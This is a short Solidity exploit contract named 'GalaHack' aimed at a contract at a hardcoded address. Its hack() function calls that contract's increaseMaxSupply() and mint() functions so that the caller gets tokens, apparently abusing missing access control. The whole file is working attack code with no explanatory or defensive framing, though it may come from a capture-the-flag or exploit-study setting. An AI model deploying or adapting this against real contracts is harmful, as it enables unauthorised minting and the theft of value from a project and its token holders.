//SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface Gala {
    function mint(address _to) external;
    function increaseMaxSupply() external;
}

contract GalaHack {
    Gala public gala = Gala(0x484Ec30Feff505b545Ed7b905bc25a6a40589181);

    function hack() public {
        gala.increaseMaxSupply();
        gala.mint(msg.sender);
    }
}